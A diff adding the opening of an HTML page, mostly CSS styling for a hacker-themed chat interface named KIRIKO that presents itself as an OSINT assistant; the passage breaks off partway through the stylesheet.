@@ -1,0 +1,3163 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>霧子 KIRIKO</title>
+  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400&family=Cormorant+Garamond:ital,wght@1,300&family=Noto+Serif+JP:wght@200&display=swap" rel="stylesheet">
+
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg:        #07070e;
+      --bg-header: #0a0a14;
+      --bg-user:   #111828;
+      --bg-asst:   #0d0d17;
+      --bg-tool:   #09091400;
+      --accent:    #a8c8ff;
+      --accent2:   rgba(168,200,255,0.45);
+      --text:      #c4d0ec;
+      --text-dim:  rgba(200,212,240,0.45);
+      --border:    rgba(168,200,255,0.09);
+      --glow:      rgba(100,160,255,0.30);
+      --red:       #c0392b;
+      --red-glow:  rgba(192,57,43,0.50);
+      --scrollbar: rgba(168,200,255,0.12);
+    }
+
+    html, body {
+      height: 100%;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Courier New', Courier, monospace;
+      font-size: 14px;
+      overflow: hidden;
+    }
+
+    /* ── Matrix canvas: behind everything ─────────────────────────────── */
+    #matrix {
+      position: fixed; inset: 0;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    /* ── Scanlines ──────────────────────────────────────────────────────── */
+    body::after {
+      content: ''; position: fixed; inset: 0; z-index: 999;
+      pointer-events: none;
+      background: repeating-linear-gradient(0deg,
+        transparent 0, transparent 2px,
+        rgba(0,0,0,.03) 2px, rgba(0,0,0,.03) 3px);
+    }
+
+    /* ── Layout ─────────────────────────────────────────────────────────── */
+    #app {
+      position: relative; z-index: 1;
+      display: flex; flex-direction: column;
+      height: 100vh;
+    }
+
+    /* ── Header ─────────────────────────────────────────────────────────── */
+    header {
+      flex-shrink: 0;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 24px; height: 52px;
+      background: rgba(2,4,14,0.98);
+      border-bottom: 1px solid rgba(80,140,255,0.22);
+      box-shadow: 0 1px 0 rgba(60,120,255,0.08), 0 4px 24px rgba(0,0,0,0.55);
+      backdrop-filter: blur(10px);
+    }
+    .logo {
+      display: flex; align-items: baseline; gap: 10px;
+    }
+    /* static green "online" dot before logo */
+    .logo::before {
+      content: '●';
+      color: rgba(60,220,120,0.75);
+      font-size: 6px;
+      text-shadow: 0 0 8px rgba(60,220,120,0.65);
+      margin-right: 2px;
+      align-self: center;
+    }
+    .logo-kanji {
+      font-family: 'Noto Serif JP', serif; font-weight: 200;
+      color: rgba(100,190,255,0.55); font-size: 12px;
+      letter-spacing: 0.15em;
+    }
+    .logo-latin {
+      font-family: 'Cinzel', serif; font-weight: 400;
+      color: #c8dcff; font-size: 14px; letter-spacing: 0.20em;
+      text-shadow:
+        -2px 0 rgba(255,0,60,0.70),
+         2px 0 rgba(0,255,249,0.70),
+         0 0 14px rgba(168,200,255,0.28);
+      padding-right: 0.20em;
+    }
+    .header-actions { display: flex; gap: 6px; align-items: center; }
+    .btn-icon {
+      color: rgba(120,180,255,0.62); font-size: 9px;
+      letter-spacing: 0.28em; text-transform: uppercase;
+      cursor: pointer; padding: 4px 10px;
+      border: 1px solid rgba(80,140,255,0.20); border-radius: 2px;
+      text-shadow: 0 0 6px rgba(80,160,255,0.28);
+      transition: color 0.15s, border-color 0.15s, text-shadow 0.15s, box-shadow 0.15s;
+      user-select: none;
+    }
+    .btn-icon:hover {
+      color: #a8d8ff;
+      border-color: rgba(100,180,255,0.55);
+      text-shadow: 0 0 10px rgba(100,200,255,0.70);
+      box-shadow: 0 0 12px rgba(60,140,255,0.14);
+    }
+    .btn-icon.danger:hover {
+      color: rgba(255,120,120,0.92);
+      border-color: rgba(255,80,80,0.32);
+      text-shadow: 0 0 10px rgba(255,80,80,0.45);
+      box-shadow: 0 0 12px rgba(255,60,60,0.10);
+    }
+
+    /* ── Language switcher ──────────────────────────────────────────────── */
+    /* ── File attach ────────────────────────────────────────────────────── */
+    #attach-btn {
+      flex-shrink: 0;
+      background: none; border: none; cursor: pointer;
+      color: rgba(100,170,255,0.55);
+      font-family: 'Courier New', monospace;
+      font-size: 11px; letter-spacing: 0.10em; line-height: 1;
+      padding: 0 6px 2px;
+      transition: color 0.15s, text-shadow 0.15s;
+      text-shadow: 0 0 6px rgba(80,160,255,0.30);
+      user-select: none;
+    }
+    #attach-btn:hover {
+      color: #a0d4ff;
+      text-shadow: 0 0 10px rgba(100,200,255,0.60);
+    }
+
+    #attachments-bar {
+      display: flex; flex-wrap: wrap; gap: 6px;
+      padding: 6px 14px 2px;
+    }
+    #attachments-bar.hidden { display: none; }
+
+    .attach-chip {
+      display: flex; align-items: center; gap: 5px;
+      padding: 3px 8px 3px 10px;
+      background: rgba(168,200,255,0.07);
+      border: 1px solid rgba(168,200,255,0.16);
+      border-radius: 12px;
+      font-size: 10px; letter-spacing: 0.08em;
+      color: rgba(168,200,255,0.80);
+      max-width: 220px;
+    }
+    .attach-chip .chip-name {
+      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
+    }
+    .attach-chip .chip-icon { font-size: 11px; flex-shrink: 0; }
+    .attach-chip .chip-rm {
+      flex-shrink: 0; cursor: pointer; opacity: 0.5;
+      font-size: 12px; line-height: 1;
+      transition: opacity 0.15s;
+      margin-left: 2px;
+    }
+    .attach-chip .chip-rm:hover { opacity: 1; }
+    .attach-chip.loading { opacity: 0.55; }
+
+    /* Image preview in chat bubble */
+    .bubble img.attach-img {
+      max-width: 320px; max-height: 240px;
+      border-radius: 4px; margin-top: 6px;
+      display: block; border: 1px solid var(--border);
+    }
+
+    /* ── Language switcher ──────────────────────────────────────────────── */
+    .lang-switch {
+      display: flex; align-items: center; gap: 3px;
+      margin-right: 6px;
+      padding-right: 12px;
+      border-right: 1px solid rgba(80,130,255,0.20);
+    }
+    .lang-btn {
+      font-size: 8px; letter-spacing: 0.22em;
+      color: rgba(100,165,255,0.48); cursor: pointer;
+      padding: 3px 6px; border-radius: 2px;
+      transition: color 0.15s, background 0.15s, text-shadow 0.15s;
+      user-select: none;
+    }
+    .lang-btn:hover  { color: rgba(160,210,255,0.88); }
+    .lang-btn.active {
+      color: #a8d4ff;
+      background: rgba(100,160,255,0.10);
+      text-shadow: 0 0 8px rgba(100,190,255,0.50);
+    }
+    .lang-sep { color: rgba(80,130,255,0.22); font-size: 8px; }
+
+    /* ── Messages area ───────────────────────────────────────────────────── */
+    #messages {
+      flex: 1; overflow-y: auto; overflow-x: hidden;
+      padding: 28px 0 16px;
+      display: flex; flex-direction: column; gap: 6px;
+      scroll-behavior: smooth;
+    }
+    #messages::-webkit-scrollbar       { width: 3px; }
+    #messages::-webkit-scrollbar-track { background: transparent; }
+    #messages::-webkit-scrollbar-thumb { background: var(--scrollbar); border-radius: 2px; }
+
+    /* ── Message bubbles ─────────────────────────────────────────────────── */
+    .msg-row {
+      display: flex; padding: 0 20px;
+      max-width: 860px; width: 100%;
+      margin: 0 auto; align-self: stretch;
+    }
+    .msg-row.user  { justify-content: flex-end; }
+    .msg-row.asst  { justify-content: flex-start; }
+
+    .bubble {
+      padding: 11px 15px; border-radius: 2px;
+      max-width: 72%; line-height: 1.65; word-break: break-word;
+    }
+    .bubble.user {
+      background: rgba(3,8,20,0.95);
+      border: 1px solid rgba(100,160,255,0.16);
+      border-left: 2px solid rgba(120,190,255,0.55);
+      color: #d8ecff;
+      text-shadow: 0 0 8px rgba(100,180,255,0.22);
+      letter-spacing: 0.02em; white-space: pre-wrap;
+    }
+    .bubble.asst {
+      background: rgba(14,2,4,0.95);
+      border: 1px solid rgba(200,40,50,0.13);
+      border-left: 2px solid rgba(220,45,55,0.60);
+      color: #f0dde0;
+      text-shadow: 0 0 6px rgba(200,60,70,0.10);
+      white-space: pre-wrap;
+    }
+    .bubble.asst.rendered { white-space: normal; }
+    .bubble.asst p            { margin-bottom: 0.7em; }
+    .bubble.asst p:last-child  { margin-bottom: 0; }
+    .bubble.asst ul, .bubble.asst ol { padding-left: 1.4em; margin-bottom: 0.7em; }
+    .bubble.asst li            { margin-bottom: 0.2em; }
+    .bubble.asst code {
+      background: rgba(0,20,60,0.50);
+      border: 1px solid rgba(100,160,255,0.18);
+      border-radius: 2px; padding: 1px 6px;
+      font-family: 'Courier New', monospace; font-size: 0.9em;
+      color: #a8d8ff;
+    }
+    .bubble.asst pre {
+      background: rgba(0,3,12,0.80);
+      border: 1px solid rgba(80,140,255,0.16);
+      border-left: 2px solid rgba(100,170,255,0.40);
+      border-radius: 2px; padding: 10px 14px;
+      overflow-x: auto; margin-bottom: 0.7em;
+    }
+    .bubble.asst pre code { background: none; border: none; padding: 0; }
+    .bubble.asst strong { color: rgba(255,100,110,0.95); text-shadow: 0 0 8px rgba(220,50,60,0.35); }
+    .bubble.asst h1, .bubble.asst h2, .bubble.asst h3 {
+      color: rgba(255,90,100,0.90); margin-bottom: 0.5em;
+      font-size: 1em; letter-spacing: 0.1em;
+      text-shadow: 0 0 10px rgba(220,40,50,0.30);
+    }
+
+    /* ── Tool indicator ──────────────────────────────────────────────────── */
+    .tool-row {
+      padding: 0 20px; max-width: 860px;
+      width: 100%; margin: 2px auto;
+    }
+    .tool-indicator {
+      display: inline-flex; align-items: center; gap: 8px;
+      padding: 5px 12px;
+      background: rgba(2,5,18,0.85);
+      border: 1px solid rgba(100,160,255,0.14);
+      border-left: 2px solid rgba(100,170,255,0.40);
+      border-radius: 2px; font-size: 11px;
+      color: rgba(160,200,255,0.60); letter-spacing: 0.12em;
+    }
+    .tool-indicator .tool-name { color: rgba(168,200,255,0.65); }
+    .tool-indicator.running .dots::after {
+      content: ''; animation: dots 1.2s steps(4,end) infinite;
+    }
+    .tool-indicator.done { border-color: rgba(168,200,255,0.06); opacity: 0.55; }
+    @keyframes dots {
+      0%  { content: ''; }   25% { content: '.'; }
+      50% { content: '..'; } 75% { content: '...'; }
+    }
+
+    /* ── Loading indicator — невидимый якорь для вставки сообщений ─────── */
+    #loading-row { display: none; }
+    #loading-row.visible { display: block; height: 0; padding: 0; margin: 0; overflow: hidden; }
+
+    /* ── Центральный hack-terminal убран, правый #osint-log его заменяет ── */
+    #hack-terminal {
+      display: none !important;
+      flex: 1;
+      background: rgba(2,3,11,0.97);
+      border: 1px solid rgba(100,160,255,0.18);
+      border-top: 2px solid rgba(100,170,255,0.35);
+      border-radius: 2px;
+      font-family: 'Courier New', monospace;
+      overflow: hidden;
+      box-shadow: 0 0 40px rgba(100,160,255,0.10), 0 2px 24px rgba(0,0,0,0.6);
+    }
+    #hack-term-head {
+      display: flex; align-items: center; gap: 10px;
+      padding: 6px 12px 5px;
+      background: rgba(6,8,22,0.99);
+      border-bottom: 1px solid rgba(100,160,255,0.10);
+    }
+    .hth-dots { display: flex; gap: 5px; flex-shrink: 0; }
+    .htd { width: 8px; height: 8px; border-radius: 50%; }
+    .htd-r { background: rgba(255,65,65,0.55); }
+    .htd-y { background: rgba(255,190,55,0.35); }
+    .htd-b { background: rgba(100,160,255,0.40); }
+    .hth-title {
+      flex: 1; font-size: 9px; letter-spacing: 0.18em;
+      color: rgba(100,160,255,0.38);
+    }
+    #hth-pid {
+      font-size: 8px; letter-spacing: 0.14em;
+      color: rgba(100,160,255,0.22);
+    }
+    #hack-term-body {
+      padding: 8px 14px 10px;
+      height: 112px;
+      display: flex; flex-direction: column; justify-content: flex-end;
+      overflow: hidden;
+    }
+    #hack-lines { display: flex; flex-direction: column; gap: 1px; overflow: hidden; }
+    .hl {
+      font-size: 11px; line-height: 1.55;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+      /* hlIn (transform+opacity) removed — transform creates compositor layers on each new line */
+    }
+    .hl-ts  { color: rgba(80,130,255,0.30); font-size: 10px; margin-right: 2px; }
+    .hl-ok  { color: rgba(55,205,255,0.90); }
+    .hl-err { color: rgba(255,65,65,0.88); }
+    .hl-inf { color: rgba(120,170,255,0.48); }
+    .hl-txt { color: rgba(180,210,255,0.65); }
+    .hl-val { color: rgba(220,240,255,0.95); font-weight: bold; }
+    .hl-bar { color: rgba(80,180,255,0.88); }
+    .hl-bare{ color: rgba(80,180,255,0.14); }
+
+    #hack-input-line {
+      margin-top: 5px;
+      display: flex; align-items: baseline; gap: 5px;
+      font-size: 11px; flex-shrink: 0;
+    }
+    .hi-prompt { color: rgba(100,160,255,0.50); flex-shrink: 0; letter-spacing: 0; }
+    #hi-cmd { color: rgba(212,230,255,0.82); }
+    .hi-cur {
+      color: rgba(100,160,255,0.88);
+      animation: hiCur .9s steps(1) infinite;
+    }
+    @keyframes hiCur { 0%,49%{opacity:1;} 50%,100%{opacity:0;} }
+
+    /* ── Input area ──────────────────────────────────────────────────────── */
+    #input-area {
+      flex-shrink: 0;
+      padding: 16px 20px 14px;
+      background: rgba(2,4,14,0.97);
+      border-top: 1px solid rgba(80,130,255,0.20);
+      backdrop-filter: blur(10px);
+    }
+    .input-wrap {
+      display: flex; align-items: flex-end; gap: 10px;
+      max-width: 820px; margin: 0 auto;
+    }
+    /* ── Highlight wrapper (carries border/bg) ── */
+    #inp-hl-wrap {
+      flex: 1;
+      position: relative;
+      background: rgba(0,3,10,0.98);
+      border: 1px solid rgba(80,140,255,0.20);
+      border-left: 2px solid rgba(100,180,255,0.65);
+      border-radius: 3px;
+      transition: border-left-color 0.25s, border-color 0.25s, box-shadow 0.25s;
+    }
+    #inp-hl-wrap:focus-within {
+      border-color: rgba(100,180,255,0.48);
+      border-left-color: rgba(120,210,255,0.90);
+      box-shadow: 0 0 24px rgba(60,130,255,0.13), inset 0 0 20px rgba(0,40,120,0.07);
+    }
+    /* ── Textarea: transparent text, fake block cursor ── */
+    #user-input {
+      position: relative; z-index: 2;
+      width: 100%; box-sizing: border-box;
+      background: transparent;
+      border: none; outline: none;
+      color: transparent;
+      caret-color: transparent;
+      font-family: 'Courier New', monospace;
+      font-size: 14px; line-height: 1.55;
+      padding: 10px 14px;
+      resize: none;
+      min-height: 44px; max-height: 150px;
+      overflow-y: auto;
+      letter-spacing: 0.03em;
+    }
+    #user-input::placeholder { color: rgba(80,150,255,0.30) !important; opacity: 1 !important; letter-spacing: 0.08em; }
+    /* ── Terminal block cursor ── */
+    .fake-caret {
+      color: rgba(80,180,255,0.90);
+      text-shadow: 0 0 8px rgba(60,170,255,1.0), 0 0 18px rgba(40,140,255,0.60);
+      animation: caretBlink 1s steps(1) infinite;
+    }
+    .data-line .fake-caret {
+      color: rgba(255,100,100,0.95);
+      text-shadow: 0 0 8px rgba(255,60,60,1.0), 0 0 18px rgba(210,30,30,0.60);
+    }
+    @keyframes caretBlink { 0%,49%{opacity:1} 50%,100%{opacity:0} }
+    #user-input::-webkit-scrollbar       { width: 2px; }
+    #user-input::-webkit-scrollbar-track { background: transparent; }
+    #user-input::-webkit-scrollbar-thumb { background: rgba(100,160,255,0.18); }
+    /* ── Colored text overlay ── */
+    #input-highlight {
+      position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+      padding: 10px 14px; box-sizing: border-box;
+      font-family: 'Courier New', monospace;
+      font-size: 14px; line-height: 1.55;
+      letter-spacing: 0.03em;
+      white-space: pre-wrap; word-break: break-word;
+      overflow-y: scroll; scrollbar-width: none;
+      pointer-events: none; z-index: 1;
+    }
+    #input-highlight::-webkit-scrollbar { display: none; }
+    #input-highlight .cmd-line {
+      color: #90ccff;
+      text-shadow:
+        -2px 0 rgba(255,0,60,0.15),
+         2px 0 rgba(0,255,249,0.28),
+        0 0 5px rgba(140,210,255,1.00),
+        0 0 14px rgba(80,170,255,0.80),
+        0 0 32px rgba(50,130,255,0.45),
+        0 0 60px rgba(30,100,255,0.20);
+    }
+    #input-highlight .data-line {
+      color: rgba(255,115,120,0.96);
+      text-shadow:
+        -2px 0 rgba(255,0,60,0.65),
+         2px 0 rgba(0,255,249,0.30),
+        0 0 5px rgba(255,80,80,1.00),
+        0 0 14px rgba(220,40,50,0.80),
+        0 0 32px rgba(180,20,30,0.45),
+        0 0 60px rgba(150,10,20,0.22);
+    }
+    #send-btn {
+      width: 44px; height: 44px;
+      background: rgba(0,30,80,0.40);
+      border: 1px solid rgba(100,180,255,0.30);
+      border-radius: 2px;
+      color: rgba(140,210,255,0.80); font-size: 13px;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      transition: color 0.15s, border-color 0.15s, box-shadow 0.15s, background 0.15s;
+      flex-shrink: 0;
+      text-shadow: 0 0 8px rgba(100,200,255,0.50);
+    }
+    #send-btn:hover:not(:disabled) {
+      color: #c0e8ff;
+      border-color: rgba(120,200,255,0.65);
+      background: rgba(0,50,120,0.50);
+      box-shadow: 0 0 16px rgba(80,160,255,0.22);
+    }
+    #send-btn:disabled { opacity: 0.22; cursor: default; }
+    .hint-text {
+      text-align: center; font-size: 9px;
+      color: rgba(140,185,255,0.48); letter-spacing: 0.18em;
+      margin-top: 9px;
+    }
+
+    /* ── Welcome screen ──────────────────────────────────────────────────── */
+    #welcome {
+      display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      gap: 18px; flex: 1; padding: 40px; text-align: center;
+    }
+    .welcome-title {
+      font-family: 'Cinzel', serif; font-weight: 700;
+      font-size: 48px; letter-spacing: 0.45em;
+      color: #c8dcff;
+      text-shadow:
+        -4px 0 rgba(255,0,60,0.75),
+         4px 0 rgba(0,255,249,0.75),
+         0 0 18px rgba(168,200,255,0.30);
+      padding-right: 0.45em;
+    }
+    .welcome-sub {
+      display: flex; gap: 0.55em; flex-wrap: wrap;
+      justify-content: center; align-items: baseline;
+    }
+    .ws-1, .ws-2, .ws-3 {
+      font-family: 'Courier New', monospace;
+      font-weight: 700; font-size: 12px;
+      letter-spacing: 0.38em; padding-right: 0.38em;
+      text-transform: uppercase;
+    }
+    /* КАЖДЫЙ — цвет кнопок шапки с аберрацией */
+    .ws-1 {
+      color: rgba(100,155,220,0.42);
+      text-shadow:
+        -2px 0 rgba(255,0,60,0.22),
+         2px 0 rgba(0,255,249,0.32),
+         0 0 10px rgba(80,140,220,0.14);
+    }
+    /* ОСТАВЛЯЕТ — цвет кнопок шапки с аберрацией */
+    .ws-2 {
+      color: rgba(100,155,220,0.42);
+      text-shadow:
+        -2px 0 rgba(255,0,60,0.22),
+         2px 0 rgba(0,255,249,0.32),
+         0 0 10px rgba(80,140,220,0.14);
+    }
+    /* СЛЕД — красный приглушённый */
+    .ws-3 {
+      display: inline-block; /* нужно для transform в глитче */
+      color: #c03040;
+      text-shadow:
+        -2px 0 rgba(255,0,60,0.40),
+         2px 0 rgba(0,255,249,0.12),
+         0 0 14px rgba(200,30,45,0.40);
+    }
+    /* Darken the matrix behind the welcome text */
+    #welcome::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse 50% 35% at 50% 50%,
+        rgba(6,6,14,0.82) 0%, transparent 100%);
+      pointer-events: none;
+      z-index: -1;
+    }
+    #welcome { position: relative; }
+
+    /* ── Modals ──────────────────────────────────────────────────────────── */
+    .modal-overlay {
+      position: fixed; inset: 0; z-index: 200;
+      background: rgba(4,4,10,0.80);
+      display: flex; align-items: center; justify-content: center;
+      backdrop-filter: blur(6px);
+      animation: fadeIn .2s ease;
+    }
+    .modal-overlay.hidden { display: none; }
+    @keyframes fadeIn { from { opacity:0 } to { opacity:1 } }
+
+    .modal-box {
+      background: rgba(2,5,16,0.98);
+      border: 1px solid rgba(100,160,255,0.20);
+      border-top: 2px solid rgba(100,180,255,0.45);
+      border-radius: 2px;
+      width: 560px; max-width: 92vw;
+      max-height: 72vh;
+      display: flex; flex-direction: column;
+      box-shadow: 0 0 60px rgba(60,110,255,0.15), 0 20px 60px rgba(0,0,0,0.7);
+    }
+    .modal-box.small { width: 300px; }
+
+    .modal-head {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 14px 18px 13px;
+      border-bottom: 1px solid var(--border);
+      flex-shrink: 0;
+    }
+    .modal-title {
+      font-size: 10px; letter-spacing: 0.38em;
+      color: var(--accent2); text-transform: uppercase;
+    }
+    .modal-close {
+      color: var(--text-dim); font-size: 18px; cursor: pointer;
+      line-height: 1; transition: color 0.2s; user-select: none;
+    }
+    .modal-close:hover { color: var(--accent); }
+
+    /* History list */
+    .modal-body {
+      flex: 1; overflow-y: auto; padding: 8px 0;
+    }
+    .modal-body::-webkit-scrollbar       { width: 3px; }
+    .modal-body::-webkit-scrollbar-thumb { background: var(--scrollbar); }
+
+    .hist-empty {
+      padding: 32px; text-align: center;
+      color: var(--text-dim); font-size: 11px; letter-spacing: 0.15em;
+    }
+    .hist-item {
+      padding: 11px 18px;
+      border-bottom: 1px solid rgba(168,200,255,0.05);
+      display: flex; align-items: flex-start; gap: 12px;
+      transition: background 0.2s;
+    }
+    .hist-item:last-child { border-bottom: none; }
+    .hist-item:hover { background: rgba(168,200,255,0.03); }
+    .hist-meta { flex: 1; cursor: pointer; }
+    .hist-title {
+      color: rgba(200,220,255,.80); font-size: 12px;
+      letter-spacing: 0.03em; line-height: 1.4;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+      max-width: 340px;
+    }
+    .hist-date {
+      color: var(--text-dim); font-size: 9px;
+      letter-spacing: 0.12em; margin-top: 4px;
+    }
+    .hist-actions { display: flex; gap: 5px; flex-shrink: 0; margin-top: 1px; }
+    .hist-btn {
+      font-size: 9px; letter-spacing: 0.16em;
+      color: var(--text-dim); cursor: pointer;
+      padding: 3px 7px;
+      border: 1px solid rgba(168,200,255,0.08);
+      border-radius: 3px;
+      transition: all 0.2s; user-select: none; white-space: nowrap;
+    }
+    .hist-btn:hover { color: var(--accent); border-color: rgba(168,200,255,0.25); }
+    .hist-btn.del:hover { color: rgba(255,100,100,.75); border-color: rgba(255,100,100,.20); }
+
+    /* Download options */
+    .dl-options {
+      padding: 18px;
+      display: flex; flex-direction: column; gap: 8px;
+    }
+    .dl-opt {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 10px 14px;
+      border: 1px solid rgba(168,200,255,0.10);
+      border-radius: 5px; cursor: pointer;
+      transition: all 0.2s;
+    }
+    .dl-opt:hover { border-color: rgba(168,200,255,0.30); background: rgba(168,200,255,0.04); }
+    .dl-opt-label { font-size: 11px; letter-spacing: 0.20em; color: rgba(168,200,255,0.80); }
+    .dl-opt-ext   { font-size: 9px;  letter-spacing: 0.12em; color: var(--text-dim); }
+    .dl-note {
+      padding: 0 18px 16px;
+      font-size: 9px; letter-spacing: 0.1em;
+      color: rgba(168,200,255,0.22); text-align: center;
+    }
+    .dl-empty {
+      padding: 24px 18px; text-align: center;
+      font-size: 11px; letter-spacing: 0.12em;
+      color: var(--text-dim);
+    }
+
+    /* ══ HACKER UI ENHANCEMENTS ════════════════════════════════════════ */
+
+
+    /* ── Terminal prompt ──────────────────────────────────────────────── */
+    .term-prompt {
+      flex-shrink: 0;
+      font-family: 'Courier New', monospace;
+      font-size: 14px; color: rgba(100,200,255,0.90);
+      padding-bottom: 12px;
+      text-shadow: 0 0 10px rgba(100,200,255,0.70);
+      user-select: none;
+    }
+
+    /* ── Input frame corner accents ───────────────────────────────────── */
+    /* removed focus-within transition — static corners only */
+    .input-wrap { position: relative; }
+    .input-wrap::before, .input-wrap::after {
+      content: ''; position: absolute;
+      width: 10px; height: 10px;
+      pointer-events: none; z-index: 3;
+      opacity: 0.60;
+    }
+    .input-wrap::before {
+      top: 0; left: 36px;
+      border-top: 1px solid rgba(100,200,255,0.65);
+      border-left: 1px solid rgba(100,200,255,0.65);
+    }
+    .input-wrap::after {
+      bottom: 0; right: 54px;
+      border-bottom: 1px solid rgba(100,200,255,0.65);
+      border-right:  1px solid rgba(100,200,255,0.65);
+    }
+
+    /* keystroke flash animations removed — caused OOM when typing fast */
+
+    /* ── Bytes / char meta line ───────────────────────────────────────── */
+    .input-meta {
+      max-width: 820px; margin: 3px auto 0;
+      padding: 0 2px;
+      display: flex; justify-content: space-between;
+      font-family: 'Courier New', monospace;
+      font-size: 8px; letter-spacing: 0.13em;
+    }
+    #bytes-out { color: rgba(100,165,255,0.42); }
+    #bytes-out.lit { color: rgba(168,210,255,0.70); }
+    #char-out  { color: rgba(100,165,255,0.36); }
+
+    /* ── Message labels ───────────────────────────────────────────────── */
+    .bubble.user::before {
+      content: 'root@kiriko:~$';
+      display: block;
+      font-size: 8px; letter-spacing: 0.10em;
+      color: rgba(100,200,255,0.55); margin-bottom: 6px;
+      font-family: 'Courier New', monospace;
+    }
+    .bubble.asst::before {
+      content: '[kiriko]  ▸';
+      display: block;
+      font-size: 8px; letter-spacing: 0.10em;
+      color: rgba(220,55,65,0.80); margin-bottom: 6px;
+      font-family: 'Courier New', monospace;
+      text-shadow: 0 0 8px rgba(220,40,50,0.40);
+    }
+
+    /* ── PDF download button & report links ──────────────────────────── */
+    .pdf-dl-btn {
+      display: inline-block;
+      margin-left: 6px;
+      padding: 2px 10px;
+      background: rgba(0,200,80,0.10);
+      border: 1px solid rgba(0,200,80,0.35);
+      border-radius: 3px;
+      color: rgba(0,220,100,0.90);
+      font-size: 10px; letter-spacing: 0.12em;
+      text-decoration: none;
+      transition: background 0.2s, border-color 0.2s;
+    }
+    .pdf-dl-btn:hover {
+      background: rgba(0,200,80,0.22);
+      border-color: rgba(0,220,100,0.65);
+    }
+    .sherlock-btn {
+      display: inline-block;
+      margin-left: 6px;
+      padding: 2px 10px;
+      background: rgba(60,120,255,0.10);
+      border: 1px solid rgba(80,140,255,0.35);
+      border-radius: 3px;
+      color: rgba(120,180,255,0.90);
+      font-size: 10px; letter-spacing: 0.12em;
+      text-decoration: none;
+      transition: background 0.2s, border-color 0.2s;
+    }
+    .sherlock-btn:hover {
+      background: rgba(60,120,255,0.22);
+      border-color: rgba(100,160,255,0.65);
+    }
+    .report-link {
+      color: rgba(100,180,255,0.85);
+      text-decoration: none;
+      border-bottom: 1px solid rgba(100,180,255,0.25);
+      transition: color 0.15s, border-color 0.15s;
+      word-break: break-all;
+    }
+    .report-link:hover {
+      color: #a8d8ff;
+      border-color: rgba(140,210,255,0.55);
+    }
+
+    /* ── Bubble hover micro-glitch ────────────────────────────────────── */
+    .bubble { transition: box-shadow .22s; }
+    .bubble:hover {
+      box-shadow: -1px 0 0 rgba(255,0,60,.10), 1px 0 0 rgba(0,255,249,.10);
+    }
+
+    /* ── Tool indicator running pulse ─────────────────────────────────── */
+    .tool-indicator.running::before {
+      content: '►'; font-size: 7px;
+      color: rgba(100,160,255,0.65);
+      animation: chevBlink .80s steps(1) infinite;
+      margin-right: 2px;
+    }
+    @keyframes chevBlink { 0%,48%{opacity:1;} 49%,100%{opacity:0;} }
+    .tool-indicator.done::before { content: ''; display: none; }
+
+    /* ── Messages area system watermark ──────────────────────────────── */
+    #messages { position: relative; }
+    #messages::before {
+      content: 'SYS ▸ KIRIKO-OSINT ▸ ACTIVE';
+      position: absolute; top: 6px; left: 22px;
+      font-family: 'Courier New', monospace;
+      font-size: 7px; letter-spacing: 0.22em;
+      color: rgba(100,160,255,0.08);
+      pointer-events: none; z-index: 2;
+    }
+
+    /* sendReady animation removed — box-shadow animations cost GPU layers */
+
+    /* ── Right-side OSINT terminal — широкая панель ─────────────────────── */
+    #osint-log {
+      position: fixed; right: 0; top: 52px; bottom: 110px;
+      width: 300px;
+      background: rgba(1,2,9,0.96);
+      border-left: 1px solid rgba(80,130,255,0.12);
+      border-bottom: 1px solid rgba(80,130,255,0.08);
+      z-index: 5;
+      display: flex; flex-direction: column;
+      overflow: hidden; pointer-events: none;  /* фон — клики не блокируются */
+      transform: translateX(110%);
+      opacity: 0;
+      transition: transform 0.42s cubic-bezier(0.16, 1, 0.3, 1),
+                  opacity   0.28s ease;
+    }
+    #osint-log.active {
+      transform: translateX(0);
+      opacity: 1;
+      animation: osintBoot 0.5s ease forwards;
+    }
+    @keyframes osintBoot {
+      0%   { clip-path: inset(48% 0 48% 0); opacity: 0.2; }
+      50%  { clip-path: inset(0% 0 0% 0);   opacity: 0.9; }
+      68%  { opacity: 0.5; }
+      84%  { opacity: 1.0; }
+      93%  { opacity: 0.65; }
+      100% { clip-path: inset(0);            opacity: 1.0; }
+    }
+    @media (max-width: 1230px) { #osint-log { display: none !important; } }
+
+    /* Заголовок */
+    #osint-log-head {
+      flex-shrink: 0; padding: 6px 13px 5px;
+      background: rgba(3,5,18,0.99);
+      border-bottom: 1px solid rgba(80,130,255,0.10);
+      display: flex; align-items: center; gap: 8px;
+    }
+    .olh-dots { display: flex; gap: 5px; align-items: center; flex-shrink: 0; }
+    .old { width: 7px; height: 7px; border-radius: 50%; }
+    .old-r { background: rgba(255,65,65,0.55); }
+    .old-y { background: rgba(255,190,55,0.38); }
+    .old-b { background: rgba(100,160,255,0.42); }
+    .olh-status { flex: 1; font-size: 9px; letter-spacing: 0.14em; color: rgba(80,130,255,0.38); }
+    .olh-pid    { font-size: 8px; letter-spacing: 0.10em; color: rgba(80,130,255,0.22); flex-shrink: 0; }
+    #ol-hide-btn {
+      pointer-events: auto; cursor: pointer;
+      font-size: 8px; letter-spacing: 0.18em;
+      color: rgba(100,150,255,0.38);
+      border: 1px solid rgba(80,130,255,0.15);
+      border-radius: 2px; padding: 1px 7px; margin-left: 6px; flex-shrink: 0;
+      transition: color 0.2s, border-color 0.2s;
+      user-select: none;
+    }
+    #ol-hide-btn:hover { color: rgba(255,80,80,0.85); border-color: rgba(255,60,60,0.35); }
+
+    /* Лог — заполняется сверху вниз */
+    #ol-lines {
+      flex: 1;
